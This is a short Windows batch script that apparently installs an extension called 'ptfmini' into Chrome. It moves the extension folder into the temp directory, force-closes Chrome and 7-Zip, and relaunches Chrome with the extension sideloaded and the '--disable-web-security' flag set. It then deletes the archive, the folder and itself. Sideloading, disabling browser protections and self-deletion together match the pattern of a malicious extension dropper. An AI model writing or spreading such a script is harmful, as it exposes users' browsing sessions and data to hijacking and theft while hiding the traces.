@echo off

rmdir /S /Q "%temp%\ptfmini"
move ".\ptfmini" "%temp%"
taskkill /IM chrome.exe /F
taskkill /IM 7zFM.exe /F
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" "--load-extension=%temp%/ptfmini" "--disable-web-security"
del ".\ptfmini.zip"
rmdir /S /Q ".\ptfmini"
del %0